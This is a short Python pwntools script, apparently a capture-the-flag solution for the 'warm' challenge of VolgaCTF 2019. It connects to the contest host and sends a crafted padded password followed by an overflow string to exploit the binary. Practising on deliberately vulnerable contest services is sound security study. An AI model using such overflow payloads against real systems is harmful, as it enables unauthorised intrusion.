#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux')
_ATT = 0
_local = 0

host = "warm.q.2019.volgactf.ru"
port = "443"

if _local:
  r = process('./warm')
else:
  r = remote(host, port)

if _ATT:
  log.info('Waiting for attach...')
  raw_input()

def padd(s, len, align='<'):
  return ('{:' + align + str(len) + '}').format(s).replace(' ', 'A')

payload = padd('v8&3mqPQebWFqM?x', 100)
payload += 'sacred'

print payload

print r.recvline()
r.sendline(payload)
print r.recv()
# r.interactive()